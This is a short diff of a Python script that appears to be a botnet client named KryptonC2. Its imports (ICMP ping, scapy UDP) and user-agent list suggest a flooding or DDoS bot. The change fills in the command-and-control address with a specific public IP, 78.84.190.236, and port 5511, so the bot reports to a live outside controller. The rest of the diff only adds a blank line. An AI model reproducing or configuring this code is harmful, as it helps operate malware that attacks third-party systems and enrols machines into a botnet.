@@ -10,7 +10,7 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-KRYPTONC2_ADDRESS  = "
+KRYPTONC2_ADDRESS  = "78.84.190.236"
 KRYPTONC2_PORT  = 5511
 
 base_user_agents = [
@@ -582,4 +582,5 @@ if __name__ == '__main__':
             main()
         except:
             pass
+
 
